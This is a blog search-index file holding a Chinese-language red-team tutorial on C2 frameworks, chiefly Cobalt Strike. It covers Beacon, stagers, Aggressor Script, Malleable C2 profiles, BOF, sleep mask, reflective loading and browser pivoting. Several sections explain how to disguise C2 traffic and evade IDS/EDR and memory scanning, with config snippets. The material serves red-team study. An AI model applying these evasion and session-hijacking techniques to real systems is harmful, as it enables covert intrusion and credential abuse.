<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C2</title>
    <url>/2025/04/08/C2/</url>
    <content><![CDATA[C2基础什么是 C2 框架C2（Command &amp; Control）框架是攻击链中控制阶段的核心部分，用于红队与植入目标主机的木马（Agent&#x2F;Beacon）之间建立通信，执行命令、收集信息、上传下载文件、做横向移动等等。C2 框架的本质是一套包含控制端（Server）与客户端（Payload&#x2F;Beacon）的通信系统。

主流 C2 框架架构设计拆解Cobalt Strike结构组成：

Team Server：C2 控制端，负责所有 Beacon 的统一管理。
Beacon：客户端的植入载荷，支持多种通信方式（HTTP、HTTPS、DNS、SMB 等）。
Aggressor Script：脚本引擎，支持行为自动化。
Client GUI：操作端，用于管理和执行命令。

特点：

Beacon 模块化强，通信协议支持自定义混淆。
强大的内存马管理与无文件攻击能力。
配合 Malleable C2 支持流量伪装成任意合法 Web 通信。

Sliver结构组成：

Server（sliver-server）：核心服务端，gRPC + TLS 通信。
Client（sliver-client）：CLI 或 Web UI，操作指令中心。
Implants（sliver implants）：客户端植入程序，支持多平台（Windows&#x2F;Linux&#x2F;macOS）。
Transport：支持多协议通信（HTTP&#x2F;HTTPS、DNS、MTLS、Wireguard）。

特点：

开源，Go 编写，便于二次开发。
支持多种 listener&#x2F;transport，灵活性强。
支持反射 DLL 注入、BOF 执行（内存模块化执行）。
强大的 OPSEC 特性，比如动态切换通信信道。

Metasploit Framework结构组成：

msfconsole：主控台，命令行交互中心。
exploit&#x2F;payload 模块：负责漏洞利用与载荷投递。
handler（multi&#x2F;handler）：监听器，用来接收回连。
Meterpreter：高度模块化的反向连接 shell。

特点：

经典老牌，模块最全，生态强大。
Meterpreter 支持脚本、插件、内存加载模块。
强大但略显笨重，不如 Cobalt Strike 那么轻巧隐蔽。


常见功能模块对比


功能模块
Cobalt Strike
Sliver
Metasploit



多协议通信
支持
支持
支持


模块热插拔
强
中
弱（Meterpreter 限）


内存执行
强（BOF）
强（BOF）
中


插件扩展性
Aggressor 脚本
自定义模块
Ruby 模块化


操作系统支持
Windows 为主
Win&#x2F;Linux&#x2F;macOS
Win&#x2F;Linux


UI
图形界面
CLI&#x2F;Web UI
CLI


流量混淆
Malleable C2
支持多种伪装方式
基础混淆



常见问题理解为什么 C2 通信协议多样化重要？不同的网络环境下，有的端口封闭、有的协议被 DPI 检测，通信多样化能提高植入后的存活率和隐蔽性。
什么是 BOF（Beacon Object File）？BOF 是 Cobalt Strike 引入的一种运行内存模块的小型 C 语言对象文件，可以在 Beacon 中直接运行，无需生成 EXE 或 DLL，从而提升隐蔽性。Sliver 也支持类似机制。
如何理解“无文件攻击”？无文件攻击指的是不在硬盘落地任何可执行文件，所有操作都在内存中完成（例如通过 PowerShell、Reflective DLL Injection、BOF 等方式），这可以绕过大部分杀软的文件监控策略。
这些框架能扩展吗？
Cobalt Strike 的 Aggressor Script 可以写自动化逻辑、钓鱼剧本等。
Sliver 本身就是开源的，开发者可以基于其 gRPC 接口写出新模块或整合其他工具。
Metasploit 框架最容易写模块，自带模板功能，开发周期短。


红队研发该如何深入学习这些框架？
实操为主：搭环境，打靶场，不懂的功能就翻官方文档和社区。
读源码&#x2F;脚本：
Sliver 是 Go 写的，可以研究通信和 implant 架构。
Aggressor Script 学会后能帮你自动化红队很多流程。


看流量包分析通信协议：理解通信包结构对规避检测很有帮助。
做开发小模块：比如给 Sliver 增加一个新的 transport，或者给 Meterpreter 写一个提权模块。

Cobalt Strike好嘞，那我们从 Cobalt Strike 开始拆，一步步搞清楚它的整体架构、核心组件、通信机制、扩展能力还有一些常见的玩法。这玩意虽然闭源，但文档详细、生态成熟，基本是红队的标配了。

Cobalt Strike 架构核心理解Cobalt Strike 整体架构是经典的 C2 结构，分为控制端（Team Server）和被控端（Beacon），中间通过 Listener 建立通信通道。可以简单理解为：
[CS Client GUI] → [Team Server] ←→ [Beacon]

1. Team Server（服务端）
所有 Beacon 的连接都汇聚到这里。
接收 GUI 发来的操作命令，下发给 Beacon。
支持多个 listener，可用不同协议监听不同 implant。
支持操作记录、会话管理、任务队列、证书伪造等功能。

启动方式通常是：
./teamserver &lt;公网IP&gt; &lt;密码&gt;

TeamServer 是服务端大脑，很多 hook 和扩展逻辑其实都要和它打交道。

2. Beacon（客户端&#x2F;植入端）Beacon 是攻击者植入目标系统中的主力载荷，是 Cobalt Strike 的核心组件之一。它的设计非常灵活，支持多种执行方式和通信协议。
支持的通信方式：

HTTP &#x2F; HTTPS：常见 web 通道，配合 Malleable C2 做流量伪装。
DNS：低速但高隐蔽，适合静默场景。
SMB：横向移动常用，内网通信，免出网。
TCP &#x2F; Named Pipe：定制场景用得多。

Beacon 的通信机制：

默认是“轮询式通信”：
Beacon 每隔一段时间（默认 60s）主动回连 Team Server。
这个时间间隔（sleep）和 jitter（抖动）可以配置。


通信全程加密（SSL&#x2F;TLS），可通过 Malleable Profile 自定义。


3. Listener（监听器）Listener 是在 Team Server 上开的一种“通信协议通道”，Beacon 会回连到这个 listener。
你可以配置不同协议的 listener，比如：
Listener: HTTPSPayload: windows/beacon_https/reverse_httpsHost: https://c2.example.com

Listener 是一个非常灵活的点，它支持用同一 Team Server 管多个 Beacon 会话，分别回连到不同端口、协议、路径、伪装页面。

Malleable C2：伪装大师这是 Cobalt Strike 最大的核心卖点之一。
它允许你自定义 C2 流量的 HTTP 请求&#x2F;响应外观，能伪装成合法网站（如微软更新、CDN 等），极大地提升流量隐蔽性。
Malleable C2 配置结构：
set useragent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;;http-get &#123;  set uri &quot;/api/status&quot;;  client &#123;    header &quot;Accept&quot; &quot;application/json&quot;;  &#125;  server &#123;    output &#123;      base64;    &#125;  &#125;&#125;

Cobalt Strike 本身提供了大量的 Malleable C2 profile 示例，比如 mimicking GitHub、Google、Microsoft 等常见服务。

Aggressor Script：自动化和扩展利器Aggressor Script 是基于 JavaScript-like 的脚本语言，用于编写自动化流程和 UI 交互功能。
功能包括：

自动生成 phishing 邮件、payload。
会话上线后自动执行命令。
自定义菜单、界面组件。
和外部工具联动（如 C2lint、Threat Intel）。

例如：
on beacon_initial &#123;  binput($1, &quot;whoami\n&quot;);  binput($1, &quot;net user\n&quot;);&#125;

这个脚本会在 beacon 上线时自动执行两个命令。

Cobalt Strike 的一些经典功能模块
攻击载荷生成（Payload Generator）：
EXE、DLL、PS1、SCT、HTA、Java、Shellcode 全家桶支持。
可通过 Artifact Kit 自定义绕杀签名。


提权（Privilege Escalation）：
UAC Bypass、令牌劫持、SeImpersonate 工具集成。


横向移动（Lateral Movement）：
PsExec、WMI、WinRM、SMB Beacon 派发。


会话管理：
Beacon 可以与其他 Beacon 建立 SMB 通道（类似链式代理）。
也支持在多 TeamServer 之间跳转（多级代理）。




常见问题答疑Beacon 会话为什么看起来“断断续续”？因为默认是轮询通信（sleep 模式），不是实时连接。需要理解 sleep 和 jitter 对通信行为的影响。可以通过 sleep 0 设置为实时响应。
如何提升 Beacon 隐蔽性？
使用 HTTPS 或 DNS 通信；
自定义 Malleable C2 Profile；
Beacon Payload 用 shellcode loader 包裹，绕过查杀；
配合睡眠混淆（sleep_mask）模块进行内存隐藏。

如何使用 BOF 模块？BOF（Beacon Object File）是 Cobalt Strike 新版支持的内存模块加载方式，类似动态链接库，在 Beacon 中加载执行但不会落地。
执行方式类似：
bof mymodule.o arg1 arg2

BOF 用 C 写，编译成 COFF 文件。

如果你接下来想动手搭个实验环境，或者深入看看 Beacon 的 payload 是怎么生效的，我可以接着带你拆 payload 结构或者讲讲 bypass AV&#x2F;EDR 的套路。你想先搞哪个？
Aggressor ScriptAggressor Script 是 Cobalt Strike 内置的一套脚本语言，用来 扩展 Cobalt Strike 的功能、实现自动化操作、增强交互性。它是基于 JavaScript 的语法风格，但专门为红队场景定制了一套 API，可以直接操作 Beacon、界面、事件钩子等。
简单来说，它就是给 Cobalt Strike 加外挂的方式，很多高级玩法都离不开它，比如：

Beacon 上线自动执行命令
自定义右键菜单
监听某个事件触发自定义行为
与外部工具联动（Web API、自动打点、图标美化…）


Aggressor Script 能干啥？我按功能分类列一下，让你有个整体感觉。
1. 自动响应事件（事件驱动）on beacon_initial &#123;  binput($1, &quot;whoami\n&quot;);&#125;

Beacon 刚上线时，自动执行 whoami 命令。
2. 扩展菜单 &#x2F; UIpopup beacon_top &#123;  item &quot;列出用户&quot; &#123;    binput($1, &quot;net user\n&quot;);  &#125;&#125;

在 Beacon 右键菜单中加一项“列出用户”，点一下就发送命令。
3. 自定义函数 &#x2F; 模块化脚本sub say_hello &#123;  println(&quot;Hello, Aggressor!&quot;);&#125;

可以封装一些重复逻辑，形成工具包式结构。
4. 自动生成钓鱼文件、Payload 载荷on ready &#123;  artifact(&quot;windows/beacon_http/reverse_http&quot;, &quot;exe&quot;);&#125;

启动后自动生成一个载荷文件。
5. 网络联动 &#x2F; REST API 调用local(&#x27;$res&#x27;);$res = http(&quot;GET&quot;, &quot;http://127.0.0.1/api/status&quot;);println(&quot;Status: $res&quot;);

可以向外部系统发请求，比如联动监控平台、调度框架等。

常用函数&#x2F;命令速查（选几个经典的）


函数名
用途



binput()
向 Beacon 会话发命令


beacons()
获取当前所有 beacon 会话列表


println()
输出调试信息到控制台


http()
发起 HTTP 请求


popup
自定义右键菜单


artifact()
自动生成 Payload 文件


open
弹出输入框&#x2F;对话框


dialog_text
自定义图形输入对话框



Aggressor Script 编写&amp;加载写法以 .cna 为后缀名（Cobalt Strike Native Aggressor）
例如：autorun.cna
on beacon_initial &#123;  println(&quot;Beacon上线啦！&quot;);  binput($1, &quot;whoami\n&quot;);&#125;

加载方式在 GUI 的 Cobalt Strike → Scripts 菜单中点击 Load，选中你的 .cna 脚本即可。
也可以用命令行加载：
./cobaltstrike.client -&gt; Scripts -&gt; Load -&gt; autorun.cna



Beacon Stager Stage Listener1. Listener：监听器作用：Listener 是 Cobalt Strike 设置的一个“通信入口”，用来监听 Beacon 的回连请求。

每个 Listener 对应一个通信协议（HTTP&#x2F;HTTPS&#x2F;DNS&#x2F;SMB&#x2F;TCP 等）。
在 TeamServer 上配置后，Beacon 就通过这个 Listener 回连。


2. Stager：阶段载荷加载器（小型启动器）作用：Stager 是一个体积极小的初始 payload，专门用来从 C2 下载真正的 Beacon（也就是 stage），目的是减小落地载荷体积，方便绕过防御。
流程：
[目标主机] ←→ [Stager 载荷] → 请求 Listener → 下载完整 Beacon（stage） → 注入执行

特点：

体积小（几 KB）；
可以是 shellcode、PowerShell、一段 exe，也可以是 exploit payload；
有点像“下载器”，用来拉取主菜。


3. Stage：主载荷（Beacon）作用：Stage 就是完整功能的 Beacon，包含所有核心逻辑（通信模块、命令处理、内存管理、插件加载等）。
当 Stager 成功运行，会连接 Listener 获取完整的 Beacon（二进制代码）并加载到内存执行。
特点：

可以反射注入，不落地；
功能完整，可持久化通信；
体积大（几十到几百 KB）。


4. Beacon：Cobalt Strike 的客户端作用：Beacon 是 Cobalt Strike 的 implant，它和 Team Server 通信，等待执行命令。它是 CS 攻击链的核心。
Beacon 的能力：

命令执行；
文件上传下载；
横向移动；
注入其他进程；
内存加载模块（BOF）；
通信自适应（切换 sleep、切换通道）；
模拟键盘、屏幕截图、凭证抓取等等。


举个例子（完整流程）假设使用的是 windows/beacon_http/reverse_http 类型的 payload：

创建一个 HTTP 类型的 Listener；
生成一个 Stager（例如 PowerShell 脚本）；
用户执行这个 Stager，Stager 向 Listener 发起请求；
Listener 下发完整的 Stage（Beacon）；
Beacon 加载成功，建立持久会话；
后续所有操作通过 Beacon 通信完成。


简单对比总结


名称
本质
作用
是否落地



Listener
通信服务端口
Beacon 的接收点
是


Stager
小型载荷下载器
下载主载荷（stage）
可落地


Stage
完整的 Beacon
植入目标并执行命令
通常内存


Beacon
客户端（implant）
和 C2 通信、收发命令
通常内存



实战中常见使用方式
Staged Payload（默认方式）：小载荷负责拉取大载荷，隐蔽性高，但被拦截风险大（多阶段）。
Stageless Payload（不分段）：Beacon 一次性打包在 payload 中，适合写 shellcode loader，体积大但部署简单，绕杀更灵活。

# 生成一个包含完整 beacon 的 shellcode生成方式：Attacks → Packages → Payload Generator → stageless


DPIDPI 是 Deep Packet Inspection（深度包检测） 的缩写，是一种网络安全技术，用于深入分析网络通信数据包的内容，而不仅仅是查看数据包的表面信息（如头部信息）。DPI 可以通过检查网络数据包的每一层内容，帮助检测和阻止各种网络威胁、恶意活动和合规性问题。
DPI 在数据包传输过程中逐个检查数据包的每一部分，尤其是数据部分（Payload），以便进行深层次的分析。它与传统的 包过滤 技术不同，后者通常只检查数据包的头部信息，如源地址、目的地址、端口号等。

数据包捕获：DPI 设备（例如防火墙、入侵检测系统 IDS、入侵防御系统 IPS）在网络中捕获传输的数据包。
协议分析：DPI 会解析数据包的每一层协议（例如 IP、TCP、HTTP、DNS 等），并对内容进行深度检查。
模式匹配：它会查找已知的攻击模式、恶意软件签名或协议的异常行为。
内容检查：它检查数据包中的内容，包括文件、电子邮件、网页内容、应用数据等，来识别潜在的恶意行为或泄露的信息。


Cobalt Strike 的心跳检测Cobalt Strike 的心跳检测机制Cobalt Strike 的心跳检测机制是用来保持目标系统与 Cobalt Strike 服务器之间稳定连接的技术，防止因网络防御系统（如防火墙、入侵检测系统 IDS）检测到长时间没有活动而切断连接。通过定期发送“心跳包”，Cobalt Strike 可以保持与目标系统的通信，确保不会被中断。
Beacon 的心跳机制是怎么工作的Beacon 是被控端，在目标机器里运行后，它会定时主动向 C2（Team Server）“打个招呼”，看看有没有新命令。这个定时打招呼的行为就叫做“心跳”或“回连”。
核心机制
通信方式：Beacon 主动发起 HTTP、HTTPS、DNS、SMB 等请求，向监听器询问“有命令没？”
非长连接：Beacon 不是 WebSocket 这种实时长连接，而是轮询式短连接。
状态无感知：Beacon 和 Team Server 没有持久连接，断了也不会立刻知道，只能通过心跳间隔判断“它是不是还活着”。


关键参数：sleep 和 jitterCobalt Strike 中，Beacon 心跳频率是可以精细配置的，两个最重要的参数是：
1. sleep
表示 Beacon 每次执行完任务后，等待多长时间再去联系 Team Server。
默认值是 60 秒，实际操作中推荐设置得更长（比如 150s、300s），降低被发现的概率。

sleep 150

2. jitter
用来“抖动” sleep 的时间，避免 Beacon 以固定频率通信被检测。
jitter 是一个百分比，例如：

sleep 120 30

表示每次 Beacon 回连的时间为 120 秒 ± 30%，即 84~156 秒之间波动。

Beacon 的心跳行为具体细节
Beacon 每次 sleep 结束，发起一次请求（HTTP&#x2F;DNS&#x2F;…）；
请求内容包括机器信息、任务请求、状态信息等；
Team Server 返回命令（如果有的话）；
Beacon 执行命令，把结果下一次心跳上传；
重复上述流程。

重要特性
非交互性命令会等下一次心跳才收到；
交互式命令（比如 shell、powershell）会切换为短 sleep，模拟“实时”交互；
当 Beacon 检测不到 C2 时，会自动重试，但重试间隔也基于 sleep 配置。


配置 Beacon 的心跳行为Cobalt Strike 中可以通过 Beacon Console 配置：
# 设置 Beacon 每 120 秒上线一次，jitter 为 30%sleep 120 30

还可以使用 Aggressor Script 来自动配置每个新上线的 Beacon：
on beacon_initial &#123;  binput($1, &quot;sleep 300 20\n&quot;);&#125;


如何检测 Beacon 是否还活着Team Server 端会根据 Beacon 的心跳记录来判断状态：

如果超出 sleep + jitter 的预期窗口未上线，就会在 Beacon 列表中标红；
可以主动发送命令看看是否响应，间接判断会话是否失效。


与流量检测的关系很多 IDS&#x2F;EDR 就是靠检测 Beacon 的“心跳行为”来识别 C2 通信的：

长时间无用户交互却持续访问某 IP；
心跳周期固定；
请求包格式特征明显（如固定 URI、User-Agent）。

对策
配置合理的 sleep + jitter；
使用 DNS、HTTPS 通信掩盖真实内容；
配合 Malleable C2 伪装请求头、URL、响应体；
使用分布式 Beacon（SMB 内网跳板、TCP 链式 Beacon）减小出网频率。

Beacon 的通信机制Beacon 的通信模式：交互式 vs 非交互式默认：非交互式（非实时）Beacon 默认是在 sleep 间隔内轮询式通信，它执行一个命令，结果等下次回连才传回来。这种模式叫 non-interactive mode，优点是隐蔽，缺点是慢。
临时：交互式（实时）当操作人员在 Beacon 控制台中使用一些交互性很强的命令时，比如：

shell &#x2F; powershell（临时打开一个 shell）；
execute-assembly（手动操作 .NET 程序）；
keylogger；
browserpivot。

Beacon 会临时切换为交互式模式，将 sleep 调整为极短（比如 1s），频繁回连，实现“实时命令响应”。
注意：

交互结束后，会自动恢复原本 sleep。
如果遇到防火墙、代理、NDR 监控，频繁访问可能暴露。

可以通过命令显式切换：
# 临时设置为 5 秒 sleep 进行交互sleep 5# 恢复为 300ssleep 300


Sleep Mask 睡眠混淆机制这个是高阶 OPSEC 配置的核心功能之一，尤其针对 内存扫描 和 行为监控 非常重要。
问题背景：Beacon 在 sleep 过程中虽然没在通信，但它的代码&#x2F;数据依然在内存里，这很容易被杀软扫描器查到。
例如：

某段 Beacon shellcode 一直驻留在内存；
某个 DLL 被挂起但签名异常；
某进程占用高权限但无 UI。

什么是 Sleep Mask？Sleep Mask 是一种“睡眠时清理痕迹”的技术机制。其核心思想是：
Beacon 进入 sleep 前自动清空&#x2F;加密自己的内存区域，只留下一个极简的恢复 stub。
工作流程：
Beacon 准备 sleep → 保存状态；
清空或加密自身的内存（包括代码段）；
挂起自己，等待定时器触发；
时间到 → 恢复自身代码 → 继续执行下一步。

开启方式：需要配合 BOF 模块，比如使用 sleep_mask BOF，可以让 Beacon 在每次 sleep 时执行自我抹除。
社区里也有不少自定义 Sleep Mask 的 BOF，如：

Ekko（ETW Patch + APC 调度）；
Schlock（挂起线程 + shellcode trampoline）；
Sigrun 等。


如何绕过 Beacon 心跳特征检测因为 Beacon 的心跳行为很像“机器人”，所以流量检测系统（EDR&#x2F;NDR&#x2F;IDS）特别爱抓这类流量。
以下是一些常见对抗方式：
1. 使用 Malleable C2 伪装流量
修改 Beacon 的通信 URL（如 /status-check → /cdn/api）；
修改 User-Agent（模拟 Chrome、Edge）；
添加合法 Referer、Cookie；
响应体伪装成 JSON&#x2F;XML 图片资源。

2. 调整 sleep + jitter
把 sleep 调长（如 300s），jitter 拉高（如 40%）；
多个 Beacon 不要统一间隔上线，错开上线时间；
随机插入长时间 sleep，模拟“挂机机器”。

3. 分离通信链路
利用 SMB Beacon、TCP Beacon 建立内网链路；
让真正出网通信的 Beacon 更少、更稳；
内部横向全部通过内网代理。

4. 使用 DNS 通信
利用 DNS Query 发出命令请求；
响应藏在 TXT 记录或 CNAME 返回中；
流量更像正常 DNS 解析行为，但带宽较小。

5. 动态加载 Beacon（反射注入）
Beacon 不驻留内存，而是使用 loader 每次注入后即销毁；
可结合 sleep mask + reflect loader 实现极端隐蔽。


Browser PivotBrowser Pivot（浏览器代理或浏览器跳板） 是一种高级的后渗透技术，主要用于在已经控制的目标主机上劫持其浏览器会话，从而利用目标用户已登录的浏览器身份访问内部资源、Web应用或系统，而无需再次进行身份认证。帮助攻击者利用目标主机已有的“合法身份”进行更深层次的横向渗透或数据访问。

例子你渗透进了一台内网机器，这台机器的用户正在用浏览器访问公司内部的OA系统或开发平台（并已登录），你没有这个系统的账号密码。但通过 Browser Pivot，你可以借用他的浏览器身份，以他的权限去访问那些系统，就像你坐在他电脑前操作一样。

工作原理
建立 Beacon 会话：
攻击者通过 Cobalt Strike 控制目标主机，并植入了 Beacon（即后门）。


启用 Browser Pivot：
在 Beacon 中执行 browserpivot 命令，Cobalt Strike 会注入一个 DLL 到目标机器的浏览器进程中（如 Chrome、Edge 或 IE）。
这个 DLL 会拦截浏览器发出的 HTTP 请求，并将其代理转发到 Cobalt Strike。


设置 SOCKS 代理：
攻击者可以在自己的机器上设置一个 SOCKS 代理，并通过这个代理访问目标浏览器“正在登录”的 Web 应用。
所有请求都是从目标机器浏览器发出的，服务端会认为是“合法用户”的操作。


访问目标内部系统：
攻击者现在可以在自己的浏览器或 Burp Suite 中设置 SOCKS 代理，访问原本无法访问的系统（如内网OA、内网Git、K8s Dashboard等）。
所有请求都继承了目标用户当前的登录状态（如Cookie、Session等），不需要再次输入账号密码。




与普通代理的区别


特性
普通代理
Browser Pivot



是否继承登录状态
❌ 不继承
✅ 继承浏览器 Cookie、Session


是否注入浏览器进程
❌ 不注入
✅ 注入浏览器进程


是否可绕过认证
❌ 需要账号密码
✅ 可直接用目标已登录会话


适用目标
网络层面
应用层&#x2F;会话层



注意事项
浏览器必须是已登录状态：否则 Browser Pivot 没有意义。
有些浏览器启用了防注入机制（特别是新版 Chrome），可能会失败。
防御方可以通过监测浏览器行为和代理访问异常来识别此类行为。


Reflect LoaderReflective Loader 是什么Reflective Loader（反射加载器）是一种内存加载技术，其核心目的是：
在不依赖操作系统的标准加载机制（如 LoadLibrary）和不落地磁盘的情况下，在内存中手动加载并执行 DLL 或 Shellcode。
这种技术常用于：

无文件攻击（Fileless）
恶意代码注入
绕过安全软件检测（如 AV &#x2F; EDR）
Cobalt Strike、Metasploit、BOF 等攻击链中的模块加载


Reflective Loader 的基本原理传统加载 DLL 的方式（如 LoadLibrary()）：

会使用系统 API
会写入磁盘缓存
容易被安全软件检测

而 Reflective Loader：

自己实现一套完整的 DLL 加载流程
从内存中加载 DLL（如从 Shellcode、远程注入、网络下载等）
不依赖 LoadLibrary，也不生成磁盘文件
可用于执行自定义模块、恶意插件、Beacon 等 payload

工作流程如下：

从外部接收到一段 DLL 二进制数据（可能是加密的，也可能是 shellcode 包裹的）
Reflective Loader 在自身内部完成：
映射节区
重定位地址
修复导入表（Import Address Table）
处理 TLS 回调
执行 DLL 的入口函数（DllMain）


整个过程完全发生在内存中


Reflective Loader 常用于哪些地方？


场景
描述



红队工具
如 Cobalt Strike 使用 Reflective Loader 加载 Beacon（Payload）到远程进程


Metasploit
模块 windows/meterpreter/reverse_https 中的 DLL 加载用的是反射技术


自定义后门 &#x2F; Dropper
利用反射加载器解密并运行内存中的 Payload


绕过安全检测
避免调用 LoadLibrary 或磁盘读写行为，减少被 AV&#x2F;EDR 检测的机会


免杀工具链构建
Loader + Reflective DLL + Beacon 组成一条完整免杀攻击链



和普通 DLL 加载的区别


项目
LoadLibrary 加载
Reflective Loader 加载



是否写入磁盘
是（通常落地）
否（完全在内存）


是否使用系统 API
是
否（自定义代码）


是否容易被 AV&#x2F;EDR 拦截
容易
更隐蔽


加载过程
系统帮你完成
手动完成节区映射、重定位、导入修复


支持 Shellcode 包装
否
是（常封装成 shellcode）



BOF什么是 BOF（Beacon Object File）简单定义BOF（Beacon Object File）是 Cobalt Strike 使用的一种轻量级内存模块，本质上是用 C 写的 .o（COFF 格式）目标文件，专门设计用于在 Beacon 内部运行的。
可以理解为：Beacon 的“内存插件”。

为什么需要 BOF在早期，Cobalt Strike 想在被控主机上执行一些高级操作（比如获取权限、内存扫描、hook 某模块等），需要：

上传一个 EXE&#x2F;DLL；
注入执行；
或者用 PowerShell 调用。

问题是这些操作都会：

落地磁盘 → 容易被查杀；
调用系统 API 太明显 → EDR 抓得飞起。

于是引入 BOF 模型：

用 C 编写轻量逻辑；
编译成 .o 文件；
在 Beacon 中由内置解释器运行；
不需要落地、不调用 CreateProcess、甚至可避开常规 API。


BOF 的工作原理
在攻击机编写 BOF 脚本（C 语言）；
用 MinGW 编译成 .o 文件（COFF 目标文件）；
用 bof 命令加载 .o 文件进 Beacon；
Beacon 在内存中调用内置解释器运行；
操作完成，自动销毁，内存无残留。


Sleep Mask：与 BOF 结合的隐蔽技术问题背景Beacon 在 sleep 过程中虽然暂停执行，但它的代码&#x2F;数据还在内存，可能被：

杀软扫描；
EDR 扫描异常 PE 签名；
进程注入分析、代码段遍历等。

Sleep Mask 的目标就是让 Beacon 在“睡着”的时候彻底“藏起来”。

Sleep Mask 原理概述
Beacon 准备进入 sleep；
执行自我擦除逻辑（自我加密&#x2F;清空）；
设置定时器或挂起；
到时间后 → 自我恢复，继续工作。

技术点包括
加密 .text 段（代码段）；
抹除函数符号、导入表；
恢复时重新加载函数地址；
可选使用 APC、Thread Hijack、ETW Patch 技术隐匿恢复动作。


BOF 如何实现 Sleep MaskSleep Mask 逻辑通常是通过一个专用的 BOF 模块完成的
void go(char *args, int len) &#123;    mask_beacon();&#125;


mask_beacon() 是封装好的加密&#x2F;清除主模块代码逻辑；
BOF 执行后，Beacon 的内存内容在 sleep 期间完全变形；
到时间后自动解密，还原执行流程。

有些 BOF 甚至还可以：

动态修改 Beacon 模块结构；
使用 syscalls 替代 WinAPI 进行内存操作；
完全避免调用敏感函数（CreateThread、VirtualAlloc 等）。


Sleep Mask + BOF 的组合优势


项目
传统方式
BOF + Sleep Mask



隐蔽性
一直驻留内存，容易被查
清空内存内容，动态恢复


落地风险
可能写入磁盘
完全内存中运行


检测风险
代码签名、模块名暴露
自定义格式、无标准模块


性能
稳定但占资源
轻量、只执行一次



小结
BOF 是 Beacon 内部运行的轻量模块插件，用 C 写，运行在内存中，无需落地；
Sleep Mask 是一种在 sleep 期间隐藏自身代码的技术，防止内存扫描被发现；
两者结合，可以极大提升 Beacon 的隐蔽性，绕过杀软、EDR 检测；
是红队中期持久化阶段非常关键的能力。

Malleable C2Malleable C2：流量伪装引擎Malleable C2 是 Cobalt Strike 中用于自定义 Beacon 和 Team Server 通信流量外观的配置机制。它的核心目标是：

让 C2 流量“看起来像正常流量”；
绕过 IDS&#x2F;WAF&#x2F;NDR 等基于流量模式的检测；
伪装成合法网站（CDN、API、更新服务等）。


Malleable C2 的工作原理默认情况下，Beacon 的回连行为是固定的：

请求路径：/submit.php
User-Agent：CobaltStrike Beacon
数据格式：Base64 编码后的任务包

这太容易被规则匹配或流量学习算法检测了。
于是引入 profile 文件，可以修改 Beacon 请求的：

URI、路径结构；
请求方法（GET&#x2F;POST）；
头部字段（User-Agent、Cookie、Referer 等）；
请求包体（格式、加密、混淆方式）；
响应内容（伪装为图像、JSON、HTML 页面）；
Beacon 的 metadata 加密、编码方式。


一个简单的 profile 示例set useragent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;;set sleeptime &quot;30000&quot;;  // 30 秒http-get &#123;    set uri &quot;/api/status&quot;;    client &#123;        header &quot;Accept&quot; &quot;application/json&quot;;        metadata &#123;            netbios;            prepend &quot;ID=&quot;;            base64;        &#125;    &#125;    server &#123;        output &#123;            print;        &#125;    &#125;&#125;

这段配置的含义是：

Beacon 回连使用路径 /api/status
使用的 User-Agent 是正常浏览器；
将 metadata 结构体用 netbios 编码、base64，再加个 ID&#x3D; 前缀；
Server 端的响应就直接打印出来（可自定义为图片等内容）。


Malleable C2 的几个重要块1. http-get &amp; http-post定义 Beacon 上线请求的行为（GET 请求）和命令执行结果上传行为（POST 请求）。
每个块中可配置：

uri
client &#123;&#125;：请求头部 &amp; 编码方式
server &#123;&#125;：响应头部 &amp; 内容格式


2. metadata、id, output, post-ex这些是 Beacon 与 Team Server 通信时的几种数据类型：



名称
说明



metadata
Beacon 上线时发给 C2 的信息（包括 hostname、user、IP、etc）


id
会话 ID，用来识别这个 Beacon


output
Beacon 执行命令后的返回数据


post-ex
Beacon 执行 post-ex 模块（像 shell、inject）后的数据


这些字段支持加密、编码、混淆（xor、netbios、base64、prepend、append 等）。

3. http-stager 块（仅 staged payload 使用）定义最初那个 stager 的 HTTP 下载行为（即 Beacon 拉取 stage 时使用的请求样式）：
http-stager &#123;    server &#123;        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;    &#125;    client &#123;        header &quot;User-Agent&quot; &quot;Mozilla/5.0&quot;;    &#125;&#125;


怎么创建并使用 Malleable C2 配置？
参考官方样例或 GitHub 上的 Malleable C2 Profile 集合；
使用工具检查合法性：

c2lint my.profile


启动 teamserver 时加载 profile：

./teamserver &lt;IP&gt; &lt;pass&gt; my.profile


实战中常用的伪装思路


模拟对象
方法



CDN（Cloudflare）
使用 /cdn-cgi/l/email-protection、图片资源路径


GitHub API
使用 https://api.github.com/repos/... 结构


Microsoft Update
模拟 User-Agent: Windows-Update-Agent，路径带 .cab


Google Fonts
路径 /fonts?family=Roboto，响应为 JSON 或 CSS


JSON API
请求头 Accept 为 application/json，response 返回 JSON 结构包住 output


图片资源
响应用 Content-Type: image/jpeg，output 藏在图片尾部或 fake jpg header 后



Profile在 Cobalt Strike 中，profile 指的就是 Malleable C2 的配置文件，它是用一种特殊的 DSL（类似 C 的语法）写的文本文件，用来定义 Beacon 和 Team Server 通信时的“外壳伪装”。
通俗一点说：
Beacon 的流量要伪装成“正常的网络请求”，profile 就是这张“伪装成什么样”的说明书。
比如：

要把流量伪装成访问 GitHub 的样子？
要让流量头部看起来像浏览器请求？
要让传输内容长得像图片？ 这些都可以在 profile 里配置。


Profile 的作用总结起来就是两点：
定义 Beacon 与 Team Server 的通信格式（数据结构 + 包样式）；
控制 Beacon 的行为参数（上线频率、jitter 抖动、user-agent、请求路径等）。


Profile 通常包含哪些内容set sleeptime &quot;60000&quot;;             // Beacon 心跳时间（毫秒）set jitter &quot;25&quot;;                   // 抖动百分比set useragent &quot;Mozilla/5.0&quot;;       // Beacon 使用的 User-Agentset dns_idle &quot;8.8.8.8&quot;;            // DNS Beacon 模式用的 Idle 值set maxdns &quot;255&quot;;                  // 最大 DNS 包长度http-get &#123;    set uri &quot;/cdn/api/status&quot;;     // Beacon GET 请求的路径    client &#123;        header &quot;Accept&quot; &quot;application/json&quot;;        metadata &#123;            base64;            prepend &quot;ID=&quot;;        &#125;    &#125;    server &#123;        output &#123;            base64;        &#125;    &#125;&#125;

这就是一个完整的通信逻辑描述文件。

Profile 的生命周期是这样的：
创建： 自己手写或用工具生成 profile 文件，后缀不限（通常 .profile）；
加载： 启动 Cobalt Strike 的 TeamServer 时传入这个文件；

./teamserver &lt;IP&gt; &lt;password&gt; profile.profile


作用： 所有 Beacon（包括生成的 payload）都会使用该 profile 定义的行为来回连；
